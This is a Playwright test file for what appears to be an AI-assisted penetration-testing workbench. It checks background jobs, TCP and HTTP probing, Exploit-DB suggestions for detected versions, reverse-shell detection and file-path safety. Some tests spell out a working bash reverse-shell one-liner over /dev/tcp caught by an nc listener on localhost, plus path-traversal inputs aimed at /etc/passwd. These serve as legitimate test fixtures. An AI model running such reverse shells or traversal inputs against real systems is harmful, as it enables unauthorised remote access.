import type { APIRequestContext } from "@playwright/test";
import { test, expect, createTask, mockRequests, mockReset, openTask, send, textOf, waitIdle, type Ids } from "./helpers";

type Call = { name: string; args: Record<string, unknown> };
const sh = (command: string): Call => ({ name: "shell", args: { command } });
const call = (name: string, args: Record<string, unknown>): Call => ({ name, args });
const tt = (...rounds: Call[][]) => `[[tt:${Buffer.from(JSON.stringify({ rounds })).toString("base64url")}]] [[nomem]]`;
async function toolOutputs(request: APIRequestContext, chatId: string): Promise<string[]> {
  const r = await (await request.get(`/api/chats/${chatId}/log`)).json();
  return r.log.filter((x: any) => x.kind === "tool_result").map((x: any) => String(x.data.output));
}
const jobs = async (request: APIRequestContext, taskId: string) => (await (await request.get(`/api/tasks/${taskId}/jobs`)).json()) as any[];

test.describe("фоновые jobs и файлы задачи", () => {
  let ids: Ids;
  test.beforeAll(async ({ request }) => { ids = await createTask(request, "Jobs и файлы"); });
  test.beforeEach(async ({ request }) => { await mockReset(request); });

  test("jobs API: запуск, вывод, остановка с сохранённым выводом и удаление", async ({ request }) => {
    const created = await request.post(`/api/tasks/${ids.task.id}/jobs`, {
      data: { name: "ticker", command: "echo JOB-START-$((20+2)); sleep 30" },
    });
    expect(created.ok(), await created.text()).toBeTruthy();
    const job = await created.json();
    expect(job).toMatchObject({ name: "ticker", running: true });

    await expect.poll(async () => {
      const r = await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output?lines=80`);
      return (await r.json()).output as string;
    }, { timeout: 15_000 }).toContain("JOB-START-22");

    const stopped = await (await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`)).json();
    expect(stopped.running).toBe(false);
    const after = await (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output`)).json();
    expect(after.output).toContain("JOB-START-22");

    await request.delete(`/api/tasks/${ids.task.id}/jobs/${job.id}`);
    expect((await jobs(request, ids.task.id)).find((j) => j.id === job.id)).toBeUndefined();
  });

  test("jobs: неверный id подсказывает существующие; повторный job_output без изменений экрана — краткий", async ({ page, request }) => {
    test.setTimeout(120_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });

    await send(page, tt([call("job_start", { name: "quietjob", command: "echo QUIET-JOB-E2E; sleep 60" })]));
    await waitIdle(page);
    const job = (await jobs(request, ids.task.id)).find((j) => j.name === "quietjob");
    expect(job?.running).toBe(true);

    await send(page, tt(
      [call("job_output", { id: "nope123" })],
      [call("job_output", { id: job.id })],
      [call("job_list", {})], // разбавить раунды: точный повтор подряд и так режет анти-луп
      [call("job_output", { id: job.id })],
    ));
    await waitIdle(page);
    const outs = await toolOutputs(request, chat.id);
    expect(outs.at(-4)).toContain("нет такого job: nope123");
    expect(outs.at(-4)).toContain("«quietjob»");
    expect(outs.at(-3)).toContain("QUIET-JOB-E2E");
    expect(outs.at(-1)).toContain("экран без изменений");
    expect(outs.at(-1)).not.toContain("QUIET-JOB-E2E");
    // дельта: после ввода в интерактивный bash следующий job_output содержит только новое
    await send(page, tt([call("job_start", { name: "deltabash", command: "bash" })]));
    await waitIdle(page);
    const djob = (await jobs(request, ids.task.id)).find((j) => j.name === "deltabash");
    expect(djob?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${djob.id}/output`)).text(), { timeout: 20_000 }).toMatch(/root@|[$#]/);
    await send(page, tt(
      [call("job_output", { id: djob.id })],
      [call("job_input", { id: djob.id, text: "echo DELTA-LINE-E2E" })],
      [call("job_output", { id: djob.id })],
    ));
    await waitIdle(page);
    const outs2 = await toolOutputs(request, chat.id);
    expect(outs2.at(-1)).toContain("только новое с прошлого job_output");
    expect(outs2.at(-1)).toContain("DELTA-LINE-E2E");
    await request.post(`/api/tasks/${ids.task.id}/jobs/${djob.id}/stop`);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`);
  });

  test("tcp_probe: баннер и диалог с TCP-сервисом без рукописных скриптов", async ({ page, request }) => {
    test.setTimeout(120_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    // тестовый сервис: шлёт баннер, на PING отвечает PONG
    const srv = [
      "cat > /tmp/probe-srv.py <<'PY'",
      "import socket",
      "s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)",
      "s.bind(('127.0.0.1', 18099)); s.listen(5); print('READY', flush=True)",
      "while True:",
      "    c, _ = s.accept()",
      "    c.sendall(b'HELLO-BANNER ready\\r\\n')",
      "    data = c.recv(1024)",
      "    c.sendall(b'PONG-E2E\\r\\n' if b'PING' in data else b'WHAT\\r\\n')",
      "    c.close()",
      "PY",
    ].join("\n");
    await send(page, tt(
      [call("shell", { command: srv })],
      [call("job_start", { name: "probesrv", command: "python3 /tmp/probe-srv.py" })],
    ));
    await waitIdle(page);
    const job = (await jobs(request, ids.task.id)).find((j) => j.name === "probesrv");
    expect(job?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output`)).text(), { timeout: 20_000 }).toContain("READY");

    await send(page, tt([call("tcp_probe", { host: "127.0.0.1", port: 18099, sends: ["PING\\r\\n"] })]));
    await waitIdle(page);
    const outs = await toolOutputs(request, chat.id);
    expect(outs.at(-1)).toContain("подключено к 127.0.0.1:18099");
    expect(outs.at(-1)).toContain("HELLO-BANNER");
    expect(outs.at(-1)).toContain("PONG-E2E");

    await send(page, tt([call("tcp_probe", { host: "127.0.0.1", port: 18098 })]));
    await waitIdle(page);
    const outs2 = await toolOutputs(request, chat.id);
    expect(outs2.at(-1)).toContain("не подключиться");
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`);
  });

  test("http_request: cookie-сессия между ходами, редиректы, формы, JSON, большое тело файлом, спойлер-гард", async ({ page, request }) => {
    test.setTimeout(180_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    const srv = [
      "cat > /tmp/http-srv.py <<'PY'",
      "from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer",
      "from urllib.parse import parse_qs",
      "class H(BaseHTTPRequestHandler):",
      "    def log_message(self, *a): pass",
      "    def _send(self, code, body, ctype='text/plain', extra=None):",
      "        b = body.encode() if isinstance(body, str) else body",
      "        self.send_response(code)",
      "        self.send_header('Content-Type', ctype)",
      "        self.send_header('Content-Length', str(len(b)))",
      "        for k, v in (extra or {}).items(): self.send_header(k, v)",
      "        self.end_headers()",
      "        self.wfile.write(b)",
      "    def do_GET(self):",
      "        if self.path == '/check':",
      "            ok = 'sess=abc123' in (self.headers.get('Cookie') or '')",
      "            self._send(200, 'AUTH-YES' if ok else 'AUTH-NO')",
      "        elif self.path == '/redir':",
      "            self._send(302, 'go away', extra={'Location': '/target'})",
      "        elif self.path == '/target':",
      "            self._send(200, '<html><head><title>Target Title</title></head><body>TARGET-PAGE</body></html>', 'text/html')",
      "        elif self.path == '/big':",
      "            self._send(200, 'B' * 20000)",
      "        else:",
      "            self._send(404, 'nope')",
      "    def do_POST(self):",
      "        n = int(self.headers.get('Content-Length') or 0)",
      "        body = self.rfile.read(n).decode('utf-8', 'replace')",
      "        if self.path == '/login':",
      "            f = parse_qs(body)",
      "            if f.get('user') == ['admin'] and f.get('pass') == ['secret1']:",
      "                self._send(302, '', extra={'Location': '/check', 'Set-Cookie': 'sess=abc123; Path=/; Expires=Wed, 01 Jan 2031 00:00:00 GMT'})",
      "            else:",
      "                self._send(403, 'DENIED')",
      "        elif self.path == '/echo-json':",
      "            self._send(200, 'ECHO:' + body, 'application/json')",
      "        else:",
      "            self._send(404, 'nope')",
      "srv = ThreadingHTTPServer(('127.0.0.1', 18097), H)",
      "print('READY', flush=True)",
      "srv.serve_forever()",
      "PY",
    ].join("\n");
    await send(page, tt(
      [call("shell", { command: srv })],
      [call("job_start", { name: "httpsrv", command: "python3 /tmp/http-srv.py" })],
    ));
    await waitIdle(page);
    const job = (await jobs(request, ids.task.id)).find((j) => j.name === "httpsrv");
    expect(job?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output`)).text(), { timeout: 20_000 }).toContain("READY");
    const B = "http://127.0.0.1:18097";
    const last = async () => (await toolOutputs(request, chat.id)).at(-1)!;

    // без кук — не авторизован; неверный пароль — 403 структурно
    await send(page, tt([call("http_request", { url: `${B}/check` })]));
    await waitIdle(page);
    expect(await last()).toContain("HTTP 200");
    expect(await last()).toContain("AUTH-NO");
    await send(page, tt([call("http_request", { url: `${B}/login`, form: { user: "admin", pass: "wrong" } })]));
    await waitIdle(page);
    expect(await last()).toContain("HTTP 403");
    expect(await last()).toContain("DENIED");

    // верный логин: 302 с кукой, следом финальная страница уже авторизованная; кука — в сессии
    await send(page, tt([call("http_request", { url: `${B}/login`, form: { user: "admin", pass: "secret1" } })]));
    await waitIdle(page);
    expect(await last()).toContain("редиректы: 302");
    expect(await last()).toContain("AUTH-YES");
    expect(await last()).toContain("куки сессии: sess@");

    // следующий ход: сессия та же — авторизация пережила ход без новых кук руками
    await send(page, tt([call("http_request", { url: `${B}/check` })]));
    await waitIdle(page);
    expect(await last()).toContain("AUTH-YES");

    // другая сессия изолирована, reset_session выбрасывает из default
    await send(page, tt([call("http_request", { url: `${B}/check`, session: "other" })]));
    await waitIdle(page);
    expect(await last()).toContain("AUTH-NO");
    await send(page, tt([call("http_request", { url: `${B}/check`, reset_session: true })]));
    await waitIdle(page);
    expect(await last()).toContain("AUTH-NO");

    // редирект без follow показывает сам 30x с Location; с follow — title и тело цели
    await send(page, tt([call("http_request", { url: `${B}/redir`, follow_redirects: false })]));
    await waitIdle(page);
    expect(await last()).toContain("HTTP 302");
    expect(await last()).toContain("Location: /target");
    await send(page, tt([call("http_request", { url: `${B}/redir` })]));
    await waitIdle(page);
    expect(await last()).toContain("title: Target Title");
    expect(await last()).toContain("TARGET-PAGE");

    // JSON-тело уходит и возвращается
    await send(page, tt([call("http_request", { url: `${B}/echo-json`, json: { ping: "pong42" } })]));
    await waitIdle(page);
    expect(await last()).toContain("pong42");

    // большое тело: превью обрезано, целиком — файлом в /work, размер файла честный
    await send(page, tt([call("http_request", { url: `${B}/big` })]));
    await waitIdle(page);
    const bigOut = await last();
    expect(bigOut).toContain("тело: 20000 байт");
    expect(bigOut).toContain("[тело обрезано в превью");
    const savedPath = /\/work\/\.whitehat\/http\/body-[\w.-]+/.exec(bigOut)?.[0];
    expect(savedPath, "путь к сохранённому телу").toBeTruthy();
    await send(page, tt([call("shell", { command: `wc -c < ${savedPath}` })]));
    await waitIdle(page);
    expect((await toolOutputs(request, chat.id)).at(-1)).toContain("20000");

    // закрытый порт — понятная ошибка, а райтапный URL не уходит в сеть вовсе
    await send(page, tt([call("http_request", { url: "http://127.0.0.1:18096/", timeout_sec: 3 })]));
    await waitIdle(page);
    expect(await last()).toContain("ошибка:");
    await send(page, tt([call("http_request", { url: `${B}/htb-jobs-writeup` })]));
    await waitIdle(page);
    expect(await last()).toContain("запрещено политикой обучения");
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`);
  });

  test("авто-обогащение: версии из вывода скана и Server-баннера получают кандидатов searchsploit без модели", async ({ page, request }) => {
    test.setTimeout(180_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });

    // строка как из nmap -sV: сервер сам находит vsftpd 2.3.4 в локальном Exploit-DB
    await send(page, tt([call("shell", { command: "printf 'PORT   STATE SERVICE VERSION\\n21/tcp open  ftp     vsFTPd 2.3.4\\n'" })]));
    await waitIdle(page);
    let outs = await toolOutputs(request, chat.id);
    expect(outs.at(-1)).toContain("эксплойты под замеченные версии");
    expect(outs.at(-1)).toContain("vsftpd 2.3.4");
    expect(outs.at(-1)).toContain("EDB-17491");
    // промпт объясняет модели статус этой подсказки
    const req = (await mockRequests(request)).filter((r) => r.kind === "agent").at(-1)!;
    expect(textOf(req.body.messages[0].content)).toContain("эксплойты под замеченные версии");

    // в выводе без версий подсказки нет — обогащение не шумит в обычных командах
    await send(page, tt([call("shell", { command: "echo HELLO-NO-VERSIONS" })]));
    await waitIdle(page);
    outs = await toolOutputs(request, chat.id);
    expect(outs.at(-1)).toContain("HELLO-NO-VERSIONS");
    expect(outs.at(-1)).not.toContain("эксплойты под замеченные версии");

    // Server-баннер ответа http_request обогащается так же
    const srv = [
      "cat > /tmp/banner-srv.py <<'PY'",
      "from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer",
      "class H(BaseHTTPRequestHandler):",
      "    server_version = 'Apache/2.4.18'",
      "    sys_version = '(Ubuntu)'",
      "    def log_message(self, *a): pass",
      "    def do_GET(self):",
      "        b = b'BANNER-PAGE'",
      "        self.send_response(200)",
      "        self.send_header('Content-Type', 'text/plain')",
      "        self.send_header('Content-Length', str(len(b)))",
      "        self.end_headers()",
      "        self.wfile.write(b)",
      "srv = ThreadingHTTPServer(('127.0.0.1', 18095), H)",
      "print('READY', flush=True)",
      "srv.serve_forever()",
      "PY",
    ].join("\n");
    await send(page, tt(
      [call("shell", { command: srv })],
      [call("job_start", { name: "bannersrv", command: "python3 /tmp/banner-srv.py" })],
    ));
    await waitIdle(page);
    const job = (await jobs(request, ids.task.id)).find((j) => j.name === "bannersrv");
    expect(job?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output`)).text(), { timeout: 20_000 }).toContain("READY");

    await send(page, tt([call("http_request", { url: "http://127.0.0.1:18095/" })]));
    await waitIdle(page);
    outs = await toolOutputs(request, chat.id);
    expect(outs.at(-1)).toContain("BANNER-PAGE");
    expect(outs.at(-1)).toContain("эксплойты под замеченные версии");
    expect(outs.at(-1)).toContain("apache 2.4.18:");
    expect(outs.at(-1)).toContain("EDB-");
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`);
  });

  test("детект reverse shell: прилёт в nc-листенер подсказывается один раз, свой bash в job не триггерит", async ({ page, request }) => {
    test.setTimeout(180_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    const last = async () => (await toolOutputs(request, chat.id)).at(-1)!;

    await send(page, tt([call("job_start", { name: "listener-18094", command: "nc -lvnp 18094" })]));
    await waitIdle(page);
    const listener = (await jobs(request, ids.task.id)).find((j) => j.name === "listener-18094");
    expect(listener?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${listener.id}/output`)).text(), { timeout: 20_000 }).toContain("Listening on");

    // листенер пуст — подсказки нет
    await send(page, tt([call("job_output", { id: listener.id })]));
    await waitIdle(page);
    expect(await last()).toContain("Listening on");
    expect(await last()).not.toContain("прилетел reverse shell");

    // «цель» сама стучится обратно настоящим интерактивным bash по /dev/tcp
    await send(page, tt([call("job_start", { name: "payload", command: "bash -i >& /dev/tcp/127.0.0.1/18094 0>&1" })]));
    await waitIdle(page);
    const payload = (await jobs(request, ids.task.id)).find((j) => j.name === "payload");
    expect(payload?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${listener.id}/output`)).text(), { timeout: 20_000 }).toContain("Connection received on");

    // сервер сам замечает прилёт в дельте и подсказывает проверку id и стабилизацию
    await send(page, tt([call("job_output", { id: listener.id })]));
    await waitIdle(page);
    expect(await last()).toContain("прилетел reverse shell");
    expect(await last()).toContain("job_input «id; hostname; pwd»");
    expect(await last()).toContain("pty.spawn");
    const req = (await mockRequests(request)).filter((r) => r.kind === "agent").at(-1)!;
    expect(textOf(req.body.messages[0].content)).toContain("прилёт reverse shell");

    // шелл настоящий: id через листенер отвечает; подсказка повторно не прикладывается
    await send(page, tt(
      [call("job_input", { id: listener.id, text: "id" })],
      [call("job_output", { id: listener.id })],
    ));
    await waitIdle(page);
    expect(await last()).toContain("uid=");
    expect(await last()).not.toContain("прилетел reverse shell");

    // свой интерактивный bash в job (root-промпт контейнера) детектор не трогает
    await send(page, tt([call("job_start", { name: "ownbash", command: "bash" })]));
    await waitIdle(page);
    const own = (await jobs(request, ids.task.id)).find((j) => j.name === "ownbash");
    expect(own?.running).toBe(true);
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${own.id}/output`)).text(), { timeout: 20_000 }).toMatch(/root@/);
    await send(page, tt([call("job_output", { id: own.id })]));
    await waitIdle(page);
    expect(await last()).toContain("root@");
    expect(await last()).not.toContain("прилетел reverse shell");

    await request.post(`/api/tasks/${ids.task.id}/jobs/${listener.id}/stop`);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${payload.id}/stop`);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${own.id}/stop`);
  });

  test("jobs: агент управляет интерактивной сессией инструментами, пользователь — из панели Jobs", async ({ page, request }) => {
    test.setTimeout(120_000);
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });

    await send(page, tt([call("job_start", { name: "shelljob", command: "bash -l" })]));
    await waitIdle(page);
    const list = await jobs(request, ids.task.id);
    const job = list.find((j) => j.name === "shelljob");
    expect(job?.running).toBe(true);

    await send(page, tt(
      [call("job_input", { id: job.id, text: "echo AGENT-JOB-$((30+5))" })],
      [call("job_output", { id: job.id, lines: 80 })],
    ));
    await waitIdle(page);
    const outs = await toolOutputs(request, chat.id);
    expect(outs.at(-1)).toContain("AGENT-JOB-35");

    await page.getByTestId("tab-jobs").click();
    await expect(page.getByTestId("jobs-panel")).toBeVisible();
    await expect(page.getByTestId("job-card").filter({ hasText: "shelljob" })).toBeVisible();
    await page.getByTestId("job-card").filter({ hasText: "shelljob" }).click();
    await expect(page.getByTestId("job-output")).toContainText("AGENT-JOB-35");
    await page.getByTestId("job-input").fill("echo UI-JOB-$((40+2))");
    await page.getByTestId("job-send").click();
    await expect(page.getByTestId("job-output")).toContainText("UI-JOB-42", { timeout: 15_000 });
    await page.getByTestId(`job-stop-${job.id}`).click();
    await expect(page.getByTestId("job-card").filter({ hasText: "shelljob" })).toHaveAttribute("data-running", "false", { timeout: 15_000 });
  });

  test("jobs: вывод сам прокручивается вниз за новыми строками; ручная отмотка вверх не сбрасывается, отправка снова прижимает вниз", async ({ page, request }) => {
    test.setTimeout(120_000);
    const created = await request.post(`/api/tasks/${ids.task.id}/jobs`, { data: { name: "scrolljob", command: "bash" } });
    expect(created.ok(), await created.text()).toBeTruthy();
    const job = await created.json();
    await expect.poll(async () => (await request.get(`/api/tasks/${ids.task.id}/jobs/${job.id}/output`)).text(), { timeout: 20_000 }).toMatch(/root@|[$#]/);

    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    await page.getByTestId("tab-jobs").click();
    await page.getByTestId("job-card").filter({ hasText: "scrolljob" }).click();
    const out = page.getByTestId("job-output");
    const gap = () => out.evaluate((el) => el.scrollHeight - el.scrollTop - el.clientHeight);
    const top = () => out.evaluate((el) => el.scrollTop);

    // своя команда из панели: вывод переполняет блок — панель сама уезжает вниз за последними строками
    await page.getByTestId("job-input").fill("for i in $(seq 1 60); do echo LINE-$i; done");
    await page.getByTestId("job-send").click();
    await expect(out).toContainText("LINE-60", { timeout: 20_000 });
    await expect.poll(gap, { timeout: 10_000 }).toBeLessThan(40);

    // пользователь отмотал вверх читать — новая активность сессии (ввод не из панели) вниз не дёргает
    await out.evaluate((el) => { el.scrollTop = 0; el.dispatchEvent(new Event("scroll")); });
    await expect.poll(top).toBe(0);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/input`, { data: { text: "for i in $(seq 61 90); do echo LINE-$i; done", enter: true } });
    await expect(out).toContainText("LINE-90", { timeout: 20_000 });
    await expect.poll(top).toBeLessThan(40);

    // а своя отправка из панели снова прижимает вывод вниз
    await page.getByTestId("job-input").fill("echo AFTER-SEND-MARK");
    await page.getByTestId("job-send").click();
    await expect(out).toContainText("AFTER-SEND-MARK", { timeout: 20_000 });
    await expect.poll(gap, { timeout: 10_000 }).toBeLessThan(40);
    await request.post(`/api/tasks/${ids.task.id}/jobs/${job.id}/stop`);
  });

  test("job_start не обходит preflight специализированного инструмента", async ({ page, request }) => {
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    await send(page, tt([call("job_start", { name: "bad", command: "searchsploit apache 2.4.18" })]));
    await waitIdle(page);
    const block = page.getByTestId("tool-block").first();
    await expect(block).toHaveAttribute("data-status", "skipped");
    expect((await jobs(request, ids.task.id)).find((j) => j.name === "bad")).toBeUndefined();
  });

  test("файлы задачи: список /work без служебных секретов, предпросмотр, скачивание и защита от traversal", async ({ page, request }) => {
    const chat = await (await request.post(`/api/tasks/${ids.task.id}/chats`)).json();
    await openTask(page, { task: ids.task, chat });
    await send(page, tt([sh("mkdir -p scans loot notes www .whitehat && printf 'SCAN-TEXT-42\\n' > scans/note.txt && printf 'BLOB' > loot/blob.bin && ln -sf /etc/passwd notes/escape && printf secret > .whitehat/should-hide.txt")]));
    await waitIdle(page);

    const list = await (await request.get(`/api/tasks/${ids.task.id}/files`)).json();
    const paths = (list.files as any[]).map((f) => f.path);
    expect(paths).toContain("TASK.md");
    expect(paths).toContain("scans/note.txt");
    expect(paths).toContain("loot/blob.bin");
    expect(paths.some((p: string) => p.startsWith(".whitehat"))).toBe(false);
    expect(paths).not.toContain("notes/escape");

    const prev = await (await request.get(`/api/tasks/${ids.task.id}/files/preview?path=${encodeURIComponent("scans/note.txt")}`)).json();
    expect(prev).toMatchObject({ path: "scans/note.txt", binary: false });
    expect(prev.text).toContain("SCAN-TEXT-42");

    const dl = await request.get(`/api/tasks/${ids.task.id}/files/download?path=${encodeURIComponent("scans/note.txt")}`);
    expect(dl.ok()).toBeTruthy();
    expect(await dl.text()).toContain("SCAN-TEXT-42");
    expect(dl.headers()["content-disposition"]).toContain("attachment");

    for (const bad of ["../agent-terminal.log", ".whitehat/should-hide.txt", "notes/escape", "/etc/passwd"]) {
      const r = await request.get(`/api/tasks/${ids.task.id}/files/download?path=${encodeURIComponent(bad)}`);
      expect(r.status(), bad).toBe(400);
    }

    await page.getByTestId("tab-files").click();
    await expect(page.getByTestId("files-panel")).toBeVisible();
    // дерево свёрнуто по умолчанию: видна папка, вложенный файл — только после раскрытия папки
    await expect(page.locator('[data-testid="file-row"][data-path="scans"]')).toBeVisible();
    await expect(page.locator('[data-testid="file-row"][data-path="scans/note.txt"]')).toHaveCount(0);
    await page.locator('[data-testid="file-row"][data-path="scans"]').click();
    await expect(page.locator('[data-testid="file-row"][data-path="scans/note.txt"]')).toBeVisible();
    await page.locator('[data-testid="file-row"][data-path="scans/note.txt"]').click();
    await expect(page.getByTestId("file-preview")).toContainText("SCAN-TEXT-42");
    await expect(page.getByTestId("file-download")).toHaveAttribute("href", /\/files\/download\?path=scans%2Fnote\.txt/);
  });
});
